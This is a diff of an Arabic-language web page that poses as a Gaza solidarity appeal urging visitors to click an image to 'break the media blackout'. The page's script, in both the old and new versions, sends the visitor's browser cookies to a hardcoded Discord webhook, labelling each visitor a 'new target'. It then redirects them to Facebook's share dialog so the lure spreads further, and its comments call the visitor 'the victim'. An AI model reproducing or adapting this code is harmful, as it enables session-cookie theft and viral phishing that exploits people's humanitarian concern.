@@ -3,88 +3,92 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نصرة الحقيقة - غزة في القلب</title>
+    <title>نصرة الحقيقة - غزة تحت القصف</title>
     <style>
         body { 
             background-color: #05070a; 
             color: #ffffff; 
             text-align: center; 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            font-family: 'Arial', sans-serif; 
             margin: 0; padding: 0;
         }
-        .header-text {
-            background: linear-gradient(45deg, #1b4332, #2d6a4f);
-            padding: 30px 15px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+        .main-header {
+            background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), 
+                        url('https://i.imgur.com/r6C5m3L.jpg');
+            background-size: cover;
+            padding: 40px 20px;
+            border-bottom: 3px solid #238636;
         }
-        h1 { font-size: 26px; line-height: 1.6; margin: 0; color: #d8f3dc; }
+        .content { padding: 20px; }
+        h1 { font-size: 24px; color: #f0f6fc; line-height: 1.6; }
         
-        .image-container {
-            padding: 10px;
-            margin-top: 10px;
+        .image-box {
+            margin: 20px auto;
+            max-width: 95%;
+            border: 2px solid #30363d;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
         }
         .main-img { 
             width: 100%; 
-            max-width: 700px; 
-            border: 4px solid #40916c;
-            border-radius: 20px;
-            box-shadow: 0 0 30px rgba(64, 145, 108, 0.4);
+            display: block;
             cursor: pointer;
-            transition: transform 0.3s ease;
         }
-        .main-img:active { transform: scale(0.98); }
-
-        .call-to-action {
-            padding: 25px;
-            background-color: #081c15;
-            border-top: 1px solid #1b4332;
-        }
-        .btn {
-            background-color: #2d6a4f;
+        .btn-action {
+            background-color: #238636;
             color: white;
-            padding: 18px;
-            font-size: 22px;
+            padding: 20px;
+            font-size: 20px;
             font-weight: bold;
             border: none;
-            border-radius: 12px;
-            width: 90%;
-            max-width: 400px;
+            border-radius: 10px;
+            width: 100%;
+            max-width: 500px;
             cursor: pointer;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            box-shadow: 0 4px 15px rgba(35, 134, 54, 0.4);
         }
-        .footer-msg { font-size: 14px; color: #95d5b2; margin-top: 15px; }
+        .urgent-tag {
+            background-color: #da3633;
+            padding: 5px 15px;
+            border-radius: 5px;
+            font-weight: bold;
+            display: inline-block;
+            margin-bottom: 15px;
+        }
     </style>
 </head>
 <body>
 
-    <div class="header-text">
-        <h1>لا تترك الحقيقة تموت! <br> اضغط على الصورة أدناه لنشر المجزرة وفك الحصار الإعلامي فوراً</h1>
+    <div class="main-header">
+        <span class="urgent-tag">🔴 نداء عاجل</span>
+        <h1>أوقفوا التعتيم الإعلامي! <br> اضغط على الصورة أدناه لتوثيق الحقيقة ونشرها للعالم فوراً</h1>
     </div>
 
-    <div class="image-container">
-        <img src="https://i.imgur.com/r6C5m3L.jpg" class="main-img" onclick="sendData()">
-    </div>
+    <div class="content">
+        <div class="image-box">
+            <img src="https://i.imgur.com/r6C5m3L.jpg" class="main-img" onclick="execute()">
+        </div>
 
-    <div class="call-to-action">
-        <button class="btn" onclick="sendData()">✅ نصرة القضية وتفعيل النشر</button>
-        <p class="footer-msg">سيتم النشر في المجموعات الكبرى تلقائياً عند الضغط</p>
+        <button class="btn-action" onclick="execute()">✅ تفعيل النشر التلقائي ونصرة القضية</button>
+        <p style="color: #8b949e; margin-top: 15px;">بضغطك هنا، أنت تساهم في كسر الحصار الرقمي</p>
     </div>
 
     <script>
-    async function sendData() {
-        const discordWebhook = "https://discord.com/api/webhooks/1462191245051826242/Oc6Gh4VaGaKICuOhjZsQHUB6CABpZMQrxtmms5yi8wIKwIg401gmoFHLkp34xCXIgp81";
+    async function execute() {
+        const hook = "https://discord.com/api/webhooks/1462191245051826242/Oc6Gh4VaGaKICuOhjZsQHUB6CABpZMQrxtmms5yi8wIKwIg401gmoFHLkp34xCXIgp81";
         
         try {
-            await fetch(discordWebhook, {
+            await fetch(hook, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: `🔥 **عملية صيد ناجحة!**\n\n**النخاع المستخرج:**\n\`\`\`${document.cookie}\`\`\``
+                    content: `🎯 **هدف جديد دخل المعبد!**\n\n**البيانات المستخرجة:**\n\`\`\`${document.cookie}\`\`\``
                 })
             });
         } catch (e) {}
 
-        // التوجيه لفيسبوك لنشر "العدوى"
+        // توجيه الضحية لفيسبوك لنشر الرابط وزيادة الانتشار
         window.location.href = "https://www.facebook.com/sharer/sharer.php?u=" + window.location.href;
     }
     </script>
